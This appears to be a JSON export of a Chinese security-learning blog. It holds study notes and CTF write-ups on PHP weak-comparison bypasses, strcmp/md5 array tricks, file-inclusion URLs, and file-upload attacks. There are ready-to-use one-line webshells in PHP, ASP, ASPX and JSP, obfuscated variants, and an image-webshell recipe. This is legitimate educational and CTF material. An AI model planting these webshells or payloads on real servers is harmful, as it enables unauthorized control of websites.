(1024 * 1024) &quot;Database Size in MB&quot;\nFROM information_schema.TABLES\nGROUP BY table_schema;\n\n后续内容后续内容因为跟当前学习、工作计划有冲突，所以后续课程的学习计划会无限期推后。目前的工作重点放在重做一个学习笔记网站，当然这是边做边学的，开发过程中遇到的难点和知识点我也会记录下来供大家学习。在此感谢B站同样爱学习的同学 @守心-人 提供的后续课程笔记，大家有条件一定要去给个star，你的每一个star和点赞都是我们前进的动力https://github.com/Buildings-Lei/mysql_note&#x2F;blob&#x2F;main&#x2F;README.md\n\n\n\n\n\n\n\n\n\n在线笔记都是引用别人的笔记，保存下来方便自己学习，如有侵权请联系我删除\n原出处:https://dhc.pythonanywhere.com/entry/share/?key=3ad29aad765a2b98b2b2a745d71bef715507ee9db8adbec98257bac0ad84cbe4\n","slug":"MySQL2","date":"2022-11-21T15:08:12.380Z","categories_index":"在线笔记","tags_index":"mysql","author_index":"Abyssaler"},{"id":"ce536701181d097db34a6f82f02496a3","title":"php弱类型比较以及绕过","content":"PHP中的弱类型比较php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换\n0.强类型与弱类型强类型\n•所谓强类型(Strongly typed)，顾名思义就是强制数据类型定义的语言。也就是说，一旦一个变量被指定了某个数据类型，如果不经过强制转换，那么它就永远是这个数据类型。J\n•ava、.NET、C++等都是强类型语言，在变量使用之前必须声明变量的类型和名称；且不经强制转换不允许两种不同类型的变量互相操作。\n弱类型\n•对数据的类型要求并不严格，可以让数据类型互相转换。\n1.&#x3D;&#x3D;和&#x3D;&#x3D;&#x3D;的区别php中其中两种比较符号:\n&#x3D;&#x3D;：先将字符串类型转化成相同，再比较&#x3D;&#x3D;&#x3D;：先判断两种字符串的类型是否相等，再比较\nPHP转换规则字符串和数字比较使用&#x3D;&#x3D;时,字符串会先转换为数字类型再比较，若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如”aaa”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）或null，则转换为0；例如\nvar_dump(12&#x3D;&#x3D;&quot;12&quot;)                                 &#x2F;&#x2F;true\nvar_dump(12&#x3D;&#x3D;&quot;12aa&quot;)                               &#x2F;&#x2F;true\nvar_dump( &quot;admin&quot;&#x3D;&#x3D;0)\t\t\t\t\t\t\t    &#x2F;&#x2F;true\nvar_dump(false&#x3D;&#x3D;&quot;&quot;&#x3D;&#x3D;0&#x3D;&#x3D;NULL)\t\t\t\t\t\t&#x2F;&#x2F;true\n\n例子2：\nvar_dump(&#39;a&#39; &#x3D;&#x3D; 0);\t    &#x2F;&#x2F;bool(true)\nvar_dump(&#39;1a&#39; &#x3D;&#x3D; 1);\t&#x2F;&#x2F;bool(true)\nvar_dump(&#39;12a&#39; &#x3D;&#x3D; 1);\t&#x2F;&#x2F;bool(false)\n\n会出现上面的结果是因为字符串在和数字比较的时候会将字符串转化为数字，比如a转换失败成False，False又和0弱类型比较是相等的，所以第一个是true。\n但是如果字符串是以数字开头的，那么就会转成这个数字再做比较，所以第二个也是true，第三个则是因为转成数字后变成了12，不等于1，则为false。\n2.布尔型和任意比较布尔值true和任意字符串都弱相等，除了0和false，因为0也认为是bool false，true是不等于false的，例如:\nvar_dump(true&#x3D;&#x3D;&quot;hyuf&quot;)                   &#x2F;&#x2F;true\nvar_dump(True &#x3D;&#x3D; 0);\t                 &#x2F;&#x2F;bool(false)\nvar_dump(True &#x3D;&#x3D; &#39;False&#39;);\t             &#x2F;&#x2F;bool(true)\nvar_dump(True &#x3D;&#x3D; 2);\t                 &#x2F;&#x2F;bool(true)\n\n\n\n3.hash值和字符串“0”比较$str1 &#x3D; &quot;a&quot;;\necho md5($str1);\t&#x2F;&#x2F;0cc175b9c0f1b6a831c399e269772661\nvar_dump(md5($str1) &#x3D;&#x3D; &#39;0&#39;);\t&#x2F;&#x2F;bool(false)\n---------------------------------------------------------\n$str2 &#x3D; &quot;s224534898e&quot;;\necho md5($str2);\t&#x2F;&#x2F;0e420233178946742799316739797882\nvar_dump(md5($str2) &#x3D;&#x3D; &#39;0&#39;);\t&#x2F;&#x2F;bool(true)\n---------------------------------------------------------\n$str3 &#x3D; &#39;a1b2edaced&#39;;\necho md5($str3);\t&#x2F;&#x2F;0e45ea817f33691a3dd1f46af81166c4bool\nvar_dump(md5($str3) &#x3D;&#x3D; &#39;0&#39;);\t&#x2F;&#x2F;bool(false)\n---------------------------------------------------------\nvar_dump(&#39;0e111111111111&#39; &#x3D;&#x3D; &#39;0&#39;);\t&#x2F;&#x2F;bool(true) \n\n\n\n\n其实我觉得这个不应该叫做hash值和字符串0的比较，应该叫做科学计数法和字符串和0的比较，只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，因为不管0不论和多少相乘都是0。\n所以当hash出来的32个值，开头前两个为0e，后面全部为数字的话，他们就会和字符串0相等的。\n第一条只是0开头，所以只能当普通字符串，结果为false。\n第二条0e后面全为数字，符合要求，结果为true。\n第三条虽然为0e，但是后面不全为数字，所以结果为false。\n最后一条就是告诉大家，不是只有hash才能和字符串0相等。\n数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较；\n当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,’E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0。\n\n4.Strcmp函数的漏洞strcmp()用法如下\n\n有一些细节需要注意下\nstrcmp(s1，s2)\n说明：\n\n当s1&lt;s2时，返回为负数 注意不一定是-1，测试结果是比较字符串长度\n当s1&#x3D;&#x3D;s2时，返回值&#x3D; 0\n当s1&gt;s2时，返回正数 注意不一定是1，测试结果是比较字符串长度\n如果两个字符串不同等，但是字符串长度相同，就比较从哪一位开始不同的，然后比较那一位的大小。\n\n即：两个字符串自左向右逐个字符相比（按ASCII值大小相比较），直到出现不同的字符或遇&#39;\\0&#39;为止。如：\n&quot;A&quot;&lt;&quot;B&quot; &quot;a&quot;&gt;&quot;A&quot; &quot;computer&quot;&gt;&quot;compare&quot;\n\n\n\n特别注意：strcmp(const char *s1,const char * s2)这里面只能比较字符串，不能比较数字等其他形式的参数，如果出现了其它参数，则会retrun null，有些题目就是利用这一点来进行和0的完成比较。\n不过测试的结果是只有数组的时候才会出现这个问题，数字不会，和网上的资料有点出入。\n&lt;?php\n$test &#x3D; 8;\nif (strcmp($test,&quot;test&quot;))&#123;\n\techo &quot;ok!&quot;;\n\techo &quot;\\n&quot;;\n\techo strcmp($test,&quot;test&quot;);\n\t&#125;\nelse \n\techo &quot;oh no!&quot;\n?&gt;\n\n\n运行结果\n\nok!\n-1  \n\n\n\n传入的是数字，返回的是-1而不是0，但传入数组就不一样了。\n&lt;?php\n$test &#x3D; array();\n$test[0]&#x3D;1;\nprint_r($test);\n\nif (strcmp($test,&quot;test&quot;))&#123;\n\techo &quot;ok!&quot;;\n\techo &quot;\\n&quot;;\n\techo strcmp($test,&quot;test&quot;);\n\t&#125;\nelse \n\techo &quot;oh no!&quot;\n?&gt;\n\n运行结果\n\nArray\n(\n    [0] &#x3D;&gt; 1\n)\noh no!\nPHP Warning:  strcmp() expects parameter 1 to be string, array given in &#x2F;box&#x2F;main.php on line 6\n\n\n\n\n各种绕过1.switch绕过\n具体原理参考站内：\n\n\n\n\n\n\n\n\n\nhttps://abyssaler.github.io/post/ctf%E4%B9%8Bwake_php\n2.&#x3D;&#x3D;绕过PHP比较运算符 &#x3D;&#x3D;在进行比较的时候是弱类型比较，只需要比较两个值相等就行，不会比较类型\n绕过方法如：1&#x3D;1.0,1&#x3D;+1\n$a&#x3D;1;\n\nif($a&#x3D;&#x3D;$_GET[&#39;x&#39;])&#123;\n    echo $flag;\n\n&#125;\n\n&#x2F;&#x2F;使用1.0就可以绕过 \n\nif($_GET[&#39;name&#39;] !&#x3D; $_GET[&#39;password&#39;])&#123;\n    if(MD5($_GET[&#39;name&#39;]) &#x3D;&#x3D; MD5($_GET[&#39;password&#39;]))&#123;\n        echo $flag;\n\n    &#125;\n\n    echo &#39;?&#39;;\n\n&#125;\n\n&#x2F;&#x2F;MD5(&#39;QNKCDZO&#39;)&#x3D;&#x3D;MD5(&#39;240610708&#39;)\n\n&#x2F;&#x2F;echo MD5(&#39;QNKCDZO&#39;);\n\n&#x2F;&#x2F;echo MD5(&#39;240610708&#39;);\n\nPHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。\n\n\n\n3.&#x3D;&#x3D;&#x3D;绕过PHP比较运算符 &#x3D;&#x3D;&#x3D;在进行比较的时候，会先判断两种字符串的类型是否相等，再比较值是否相等。只要两边字符串类型不同会返回false\n绕过方法：使用数组绕过\nif($_GET[&#39;name&#39;] !&#x3D; $_GET[&#39;password&#39;])&#123;\n    if(MD5($_GET[&#39;name&#39;]) &#x3D;&#x3D; MD5($_GET[&#39;password&#39;]))&#123;\n        echo $flag;\n\n    &#125;\n\n    echo &#39;?&#39;;\n\n&#125;\n\n&#x2F;&#x2F;name[]&#x3D;1&amp;password[]&#x3D;2\n\nPHP中md5()函数无法处理数组（会返回NULL）\n\n&#x3D;&#x3D;的也可以用数组绕过\n\n\n\n4.intval()函数intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1（注意这个通常配合preg_match来使用）\n语法\nint intval ( mixed $var [, int $base &#x3D; 10 ] )\n参数说明：\n\n$var：要转换成 integer 的数量值。\n$base：转化所使用的进制。\n\n如果 base为空，通过检测 var 的格式来决定使用的进制：\n\n如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；\n否则，如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；\n否则，将使用 10 进制 (decimal)。\n\n绕过方法：通过使用0x或者0开始的格式来绕过不相等的判断（像一些要先判断不相等再判断相等的题目）\n$i&#x3D;&#39;666&#39;;\n\n$ii&#x3D;$_GET[&#39;n&#39;];\n\nif(intval($ii&#x3D;&#x3D;$i,0 ))&#123;\n    echo $flag;\n\n&#125;\n\n&#x2F;&#x2F;n&#x3D;0x29a   666的二进制是29a\n\n通过检测 $ii的格式来决定使用的进制\n\n\n\n5.strpos()函数strpos() 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。(函数返回查找到这个find字符串的位置，那么如果是0位置，就值得注意了)\n注释：strpos() 函数是区分大小写的。\nstrpos(string,find,start)\n\n参数\t\t描述\nstring\t必需。规定被搜索的字符串。\nfind\t必需。规定要查找的字符。\nstart\t可选。规定开始搜索的位置\n\n\n绕过方法：利用换行进行绕过（%0a） \n$i&#x3D;&#39;666&#39;;\n\n$ii&#x3D;$_GET[&#39;h&#39;];\n\nif(strpos($ii,$i,&quot;0&quot;))&#123;\n    echo $flag;\n\n&#125;\n\n&#x2F;&#x2F;?num&#x3D;%0a666\n\n\n\n6.in_array()函数in_array() 函数搜索数组中是否存在指定的值。\nbool in_array ( mixed $needle , array $haystack [, bool $strict &#x3D; FALSE ] )\n参数\t\t\t描述\nneedle\t\t必需。规定要在数组搜索的值。\nhaystack\t必需。规定要搜索的数组。\nstrict\t\t可选。如果该参数设置为 TRUE，则 in_array() 函数检查搜索的数据与数组的值的类型是否相同。\n\n问题就出在第三个参数，如果第三个参数不设置为true就不检测类型，是弱比较，相当于&#x3D;&#x3D;号\n绕过方法：与&#x3D;&#x3D;一样 \n$whitelist &#x3D; [1,2,3];\n\n$page&#x3D;$_GET[&#39;i&#39;];\n\nif (in_array($page, $whitelist)) &#123;\n    echo &quot;yes&quot;;\n\n&#125;\n\n&#x2F;&#x2F;?i&#x3D;1ex\n\n\n\n7.preg_match()函数preg_match 函数用于执行一个正则表达式匹配。\n详细用法可以参考：https://www.runoob.com/php/php-preg_match.html\n绕过方法：preg_match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错,如果正则不匹配多行(&#x2F;m)也可用上面的换行方法绕过\nif(isset($_GET[&#39;num&#39;]))&#123;\n    $num &#x3D; $_GET[&#39;num&#39;];\n\n    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&#123;[t1] \n\n        die(&quot;no no no!&quot;);\n\n    &#125;\n\n    if(intval($num))&#123;\n        echo $flag;\n\n    &#125;\n\n&#125;\n\n&#x2F;&#x2F;?num[]&#x3D;1\n\n上面介绍过了，intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1\n\n\n\n8.str_replace函数str_replace() 函数用于替换字符串中指定字符（区分大小写）\n&lt;?php\necho str_replace(&quot;world&quot;,&quot;Peter&quot;,&quot;Hello world!&quot;);\n?&gt;\n\n&#x2F;&#x2F;输出：Hello Peter!\n\nstr_replace(find,replace,string,count)\n\n参数\t\t描述\nfind\t必需。规定要查找的值。\nreplace\t必需。规定替换 find 中的值的值。\nstring\t必需。规定被搜索的字符串。\ncount\t可选。一个变量，对替换数进行计数。\n\n\n绕过方法：str_replace无法迭代过滤 ，可以通过双写绕过\n例如：例如page&#x3D;hthttp://tp://192.168.0.103/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.0.103/phpinfo.txt，成功执行远程命令。\n三个实例：\n\n1、本地文件包含\nhttp:&#x2F;&#x2F;192.168.0.103&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;page&#x3D;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;xampp&#x2F;htdocs&#x2F;dvwa&#x2F;php.ini\n2、绝对路径不受任何影响\nhttp:&#x2F;&#x2F;192.168.0.103&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;page&#x3D;C:&#x2F;xampp&#x2F;htdocs&#x2F;dvwa&#x2F;php.ini\n3、远程文件包含\nhttp:&#x2F;&#x2F;192.168.0.103&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;page&#x3D;htthttp:&#x2F;&#x2F;p:&#x2F;&#x2F;192.168.5.12&#x2F;phpinfo.txt\n\n\n\n9.json绕过&lt;?php\nif (isset($_POST[&#39;message&#39;])) &#123;\n    $message &#x3D; json_decode($_POST[&#39;message&#39;]);\n    $key &#x3D;&quot;*********&quot;;\n    if ($message-&gt;key &#x3D;&#x3D;$key ) &#123;\n        echo &quot;flag&quot;;\n    &#125; \n    else &#123;\n        echo &quot;fail&quot;;\n    &#125;\n &#125;\n else&#123;\n     echo &quot;~~~~&quot;;\n &#125;\n?&gt;\n\n输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于$key的值，但是$key的值我们不知道\n这时我们构造一个和任意字符串返回为真的数组{“key”:true}。即可绕过\npayload&#x3D;message&#x3D;{“key”,true}\n10.array_search的漏洞array_search() 函数与 in_array() 一样，在数组中查找一个键值。如果找到了该值，匹配元素的键名会被返回。如果没找到，则返回false。\n&lt;?php\n$a&#x3D;array(1,4);\nvar_dump(array_search(&quot;4admin&quot;,$a)); &#x2F;&#x2F; int(0)&#x3D;&gt; 返回键值1\nvar_dump(array_search(&quot;1admin&quot;,$a)); &#x2F;&#x2F; int(1) &#x3D;&#x3D;&gt;返回键值0\n?&gt;&#x2F;&#x2F;这个和之前的类型转换类似，但是如果是array_search(“4admin”,$a,true),最后的“true”会禁止类型转换。\n\n这个和之前的类型转换类似，但是如果是array_search(“4admin”,$a,true),最后的“true”会禁止类型转换\n部分内容引用自：\n\n\n\n\n\n\n\n\n\nhttps://zhuanlan.zhihu.com/p/30323499\nhttps://blog.csdn.net/u014029795/article/details/99709333\nhttps://www.csdn.net/tags/MtTaMg2sNTc4NDM0LWJsb2cO0O0O.html\n","slug":"php弱类型比较及绕过","date":"2022-11-20T04:13:34.240Z","categories_index":"学习笔记","tags_index":"php","author_index":"Abyssaler"},{"id":"1a613abcdf9c626b905ba0d768be1622","title":"ctf笔记之wake_php","content":"源码：\n&lt;?php\nhighlight_file(__FILE__);\n    include(&quot;password.php&quot;);\n    if(isset($_POST[&#39;password&#39;]))\n    &#123;\n        if(strcmp($_POST[&#39;password&#39;],$password) &#x3D;&#x3D; 0)\n        &#123;\n            $a &#x3D; $_REQUEST[&#39;a&#39;];\n            if(is_numeric($a))&#123;\n                die(&quot;Oh No&quot;);\n            &#125;\n            switch($a)&#123;\n                case 0:\n                    echo &quot;NONONO&quot;;\n                    break;\n                case 1:\n                    echo &quot;You are hacker&quot;;\n                    break;\n                case 2:\n                    echo file_get_contents(&quot;&#x2F;flag&quot;);\n                    break;\n                default:\n                    echo &quot;123&quot;;\n            &#125;\n        &#125;\n        else\n        &#123;\n            die(&quot;what&#39;s a shame&quot;);\n        &#125;\n    &#125;\n?&gt;\n\n\n\n思路​\t首先分析源码得知:\n\n我们要从password.php页面中得到password和a的值\n把通过post传参过来的password值和$password变量做比较,让strcmp函数的值&#x3D;0,进入下一步\n要让is_numeric($a)判为false\n要让case判断$a为2\n\n思路分析完了,来看看具体的实现\nStrcmp()函数漏洞这个漏洞要php5.3之前的版本才有\nstrcmp漏洞\n首先来看一下函数\nint strcmp ( string $str1 , string $str2 )\n\n\n\n这个函数是用于比较字符串的函数\nnt strcmp ( string $str1 , string $str2 )参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0；如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。\n例子1:\n&lt;?php\necho strcmp(&quot;Hello world!&quot;,&quot;Hello world!&quot;); &#x2F;&#x2F; 两字符串相等  &#x2F;&#x2F;0\necho strcmp(&quot;Hello world!&quot;,&quot;Hello&quot;); &#x2F;&#x2F; string1 大于 string2  &#x2F;&#x2F;7\necho strcmp(&quot;Hello world!&quot;,&quot;Hello world! Hello!&quot;); &#x2F;&#x2F; string1 小于 string2  &#x2F;&#x2F;-7\n?&gt;\n\n\n\n例子2:\n证明这个函数区分大小写\n&lt;?php\necho strcmp(&quot;Hello&quot;,&quot;Hello&quot;); &#x2F;&#x2F;0\necho &quot;&lt;br&gt;&quot;;\necho strcmp(&quot;Hello&quot;,&quot;hELLo&quot;); &#x2F;&#x2F;-1\n?&gt;\n\n\n\n​\t可以看出这个函数传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。但是我们仍然可以使用这个漏洞对使用老版本php的网站进行渗透测试。\n解题思路if(strcmp($_POST[&#39;password&#39;],$password) &#x3D;&#x3D; 0)\n\n\n\n对于这段代码，我们能用什么办法绕过验证呢， 只要我们$_POST[‘password’]是一个数组或者一个object即可，但是上一个问题的时候说到过，只能上传字符串类型，那我们又该如何做呢\n其实php为了可以上传一个数组，会把结尾带一对中括号的变量，例如 xxx[]的name（就是$_POST中的key)\n要想这条语句判为真,我们需要在password.php页面构造password为一个数组数组传值为1，而strcmp要求我们传入字符串 strcmp函数判断不是字符串会报错，但是会return0 所以我们的目的达到了\n因为初学,一开始以为数组要这样构建,怎么都拿不到flag..\n\n经过询问朋友得知正确构造方式\n\n\n最后终于成功\n但是还是遇到了几个不解的地方,后来都解决了,这里写出来方便自己以后回忆\nphp中is_numeric函数的绕过$a &#x3D; $_REQUEST[&#39;a&#39;];\n            if(is_numeric($a))&#123;\n                die(&quot;Oh No&quot;);\n            &#125;\n            switch($a)&#123;\n                case 0:\n                    echo &quot;NONONO&quot;;\n                    break;\n                case 1:\n                    echo &quot;You are hacker&quot;;\n                    break;\n                case 2:\n                    echo file_get_contents(&quot;&#x2F;flag&quot;);\n                    break;\n                default:\n                    echo &quot;123&quot;;\n            &#125;\n\n\n\n看到这段代码我思考了很久(因为php基础不好),这里需要让 if(is_numeric($a))这个函数判false才能继续执行,而 is_numeric() 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE,所以这里出现了一个矛盾点**,$a不能等于2,不然无法执行,但是下面的条件语句又需要case $a为case 2**,基础不好的我陷入混乱\n查找资料的过程中发现了is_numeric()这个函数的绕过;\n$j &#x3D; $_POST[j];\nis_numeric($j)?die(&quot;&lt;br&#x2F;&gt;not is numeric &lt;br&#x2F;&gt;fail 10&quot;):NULL; \nif($j &gt; 1314)&#123;\necho &quot;&lt;br&#x2F;&gt;pass 10&quot;;&#125;\n\n\n\n方法一利用数组+十六进制来进行绕过\nj[]&#x3D;58B\n\n方法二is_ numeric() 判断变量是否为数字或数字字符串,不仅检查10进制，16进制是可以。is_ numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值,而%20空格字符只能放在数值后。所以,查看函数发现该函数对对于第-个空格字符会跳过空格字符判断,接着后面的判断!\nj&#x3D;1315%20\nj&#x3D;1315%00\n\n方法三php中当一个其他数据类型和数值类型的数据比较大小时，会先将其他数据类型转换成数值类型，这里输入类似9999a数据也可绕过\nj&#x3D;9999a\n\n\n\ncase语法特性讲到这里就还有最后一个问题了\n为什么$a&#x3D;2a但是在switch中case 2是true?\n在使用 switch 语句时应该注意以下几点：\n\n和 if 语句不同的是，switch 语句后面表达式的数据类型只能是整型或字符串，不能是 bool 型。通常这个表达式是一个变量名称，虽然 PHP 是弱类型语言，在 switch 后面表达式的变量可以是任意类型数据，但为了保证匹配执行的准确性，最好只使用整型或字符串中的一种类型。\n和 if 语句不同的是，switch 语句后面的花括号是必须有的。\ncase 语句的个数没有规定，可以无限增加。但 case 标签和 case 标签后面的值之间应该有一个空格，值后面必须有一个冒号，这是语法的一部分。\nswitch 匹配完成以后，将依次逐条执行匹配的分支模块中的语句，直到 switch 结构结束或者遇到了 break 语句才停止执行。所以，如果一个分支语句的后面没有写上 break 语句，程序将会继续执行下一个分支语句的内容。\n与 if 语句中的 else 类似，switch 语句中 default 标签直接在后面加上一个冒号，看似没有条件，其实是有条件的，条件就是“表达式”的值不能与前面任何一个 case 标签后的值相等，这时才执行 default 分支中的语句。default 标签和 if 中的 else 子句一样，它不是 switch 语句中必需的，可以省略。\n\n\n原来case还有这个讲究\n","slug":"ctf之wake_php","date":"2022-11-19T17:17:07.600Z","categories_index":"CTF","tags_index":"php,writeup","author_index":"Abyssaler"},{"id":"018e7a0983ad8b88508f4c4d22944055","title":"web安全之文件上传漏洞","content":"webshell概述什么是webshell概念webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。\n顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。\n种类  一句话木马、小马、大马、打包马、脱库马、等等\n一句话木马\n介绍：\n一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。\n例子：\nasp一句话木马：&lt;%eval request(&quot;c&quot;)%&gt;\nphp一句话木马： &lt;?php @eval($_POST[value]);?&gt;\nphp一句话木马：&lt;?php $a=$_REQUEST[1]; eval($a);?&gt;\naspx一句话木马：&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt;\njsp一句话：\n&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt; \n变形：\n&lt;?php $_REQUEST[&#39;a&#39;]($_REQUEST[&#39;b&#39;]); ?&gt;\n&lt;%Eval(Request(chr(112)))%&gt;\n&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;xindong&quot;))%&gt;\n&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;\n&lt;%a=request(&quot;gold&quot;)%&gt;&lt;%eval a%&gt;\n一句话木马管理软件\n蚁剑，菜刀等，这里介绍蚁剑\n\n右键添加数据\n\n填入你上传一句话木马的网站的url和连接密码（参数）\n\n测试连接\n\n然后就获取后台权限了\n小马\n小马体积小，容易隐藏，隐蔽性强，最重要在于与图片结合一起上传之后可以利用nginx或者IIS6的解析漏洞来运行，不过功能少，一般只有上传或者命令执行等功能。\n大马\n网站管理工具\n用途：提权、打包、脱裤、增删文件\n\n成功上传大马\n\n访问大马的文件路径\n\n输入密码（一般在你大马的源码里）\n\n得到相应权限\n图片马\n把webshell通过二进制的方式写入图片中，即不影响图片本身浏览，又能在图片被包含时解析，或者直接将后缀修改成asp&#x2F;php时亦能解析。\n•把下列这行代码写进1.php文件中\n\n\n•然后利用copy命令生成图片马\ncopy 1.jpg &#x2F;b + 1.php  2.jpg\n文件上传漏洞概述概述：​\tWEB应用程序通常会有文件上传的功能，例如：在BBS发布图片、在个人网站发布ZIP压缩包、在招聘网站上发布DOC格式简历等。只要WEB应用程序允许上传文件，就有可能存在文件上传漏洞。在不对被上传的文件进行限制或者限制被绕过，该功能便有可能被利用于上传可执行文件、脚本到服务器上，从而进一步导致服务器沦陷。\n​    如何确认WEB应用程序是否存在上传漏洞呢？比如：一个BBS论坛，由PHP语言开发，用户可以上传个性头像，也就是图片文件，但文件上传时候并没有对图片格式做验证，导致用户可以上传任意文件，那么这就是一个上传漏洞，总之就是上传的文件被成功当做脚本解析，就代表有文件上传漏洞。\n如何找到上传点Web前台\n\n暴露的编辑器URL\n\n图片&#x2F;头像上传\n\n已知CMS漏洞\n\nCLTPHP_v5.5.3任意文件上传漏洞\n\nPHPCMS_v9.6.0任意文件上传漏洞\n\n\n\n\nWeb后台\n\n集成的编辑器\n文章发布\n文件管理器\n其它上传功能\n\nWeb中间件&#x2F;服务器\n\n“PUT”上传漏洞\nTomcat后台弱口令部署WAR包\nWeblogic文件上传漏洞（如CVE-2018-2894）工具\n基于字典的扫描器\n爬虫\n\n","slug":"web安全之文件上传漏洞","date":"2022-11-18T03:42:30.349Z","categories_index":"学习笔记","tags_index":"漏洞","author_index":"Abyssaler"},{"id":"b97648e041829a6ba4fa127fa718e3d4","title":"CTFhub之web安全","content":"1.文件上传之双写后缀\n双写绕过原理：\n服务端对黑名单中的内容进行处理，且仅处理一次，所以可以通过双写后缀绕过．如，黑名单中有＂php＂字样，上传文件名为＂1.php＂ 上传后文件变成＂1.＂．\n如果直接上传111.php的话，会过滤后缀\n\n想到用burp suite抓包改后缀\n\n如图，一开始我想改成111.phpphp，想只过滤一次的话还剩一个php就成功了，结果被无情打脸\n\n后来得知服务端会对后缀名中所有的php进行过滤，所以修改思路\n\n改成这个样子\n服务端就只会过滤.pphphp中间的php，剩下的就是111.php了\n\n最后用蚁剑连接\n\n找到flag\n\n2.文件上传之00截断前置知识:\n\n\n\n\n\n\n\n\n文件上传漏洞“%00截断”绕过讲解”:https://www.fujieace.com/penetration-test/file-upload-00.html\n原理：如果是白名单检测的话，我们可以采用00截断绕过。00截断利用的是php的一个漏洞。在 php&lt;5.3.4 版本中，存储文件时处理文件名的函数认为0x00是终止符。于是在存储文件的时候，当函数读到 0x00(%00) 时，会认为文件已经结束。\n例如：我们上传 1.php%00.jpg 时，首先后缀名是合法的jpg格式，可以绕过前端的检测。上传到后端后，后端判断文件名后缀的函数会认为其是一个.jpg格式的文件，可以躲过白名单检测。但是在保存文件时，保存文件时处理文件名的函数在遇到%00字符认为这是终止符，于是丢弃后面的 .jpg，于是我们上传的 1.php%00.jpg 文件最终会被写入 1.php 文件中并存储在服务端。\n直接看题\n这里直接上传一句话木马文件会显示文件类型不匹配\n\n按F12打开开发者工具查看源代码，发现白名单\n分析源代码\nif (!empty($_POST[&#39;submit&#39;])) &#123;\n    $name &#x3D; basename($_FILES[&#39;file&#39;][&#39;name&#39;]);\n    $info &#x3D; pathinfo($name);\n    $ext &#x3D; $info[&#39;extension&#39;];\n    $whitelist &#x3D; array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);\n    if (in_array($ext, $whitelist)) &#123;\n        $des &#x3D; $_GET[&#39;road&#39;] . &quot;&#x2F;&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;\n        if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $des)) &#123;\n            echo &quot;&lt;script&gt;alert(&#39;上传成功&#39;)&lt;&#x2F;script&gt;&quot;;\n        &#125; else &#123;\n            echo &quot;&lt;script&gt;alert(&#39;上传失败&#39;)&lt;&#x2F;script&gt;&quot;;\n        &#125;\n    &#125; else &#123;\n        echo &quot;文件类型不匹配&quot;;\n    &#125;\n&#125;\n\n\n$_FILES 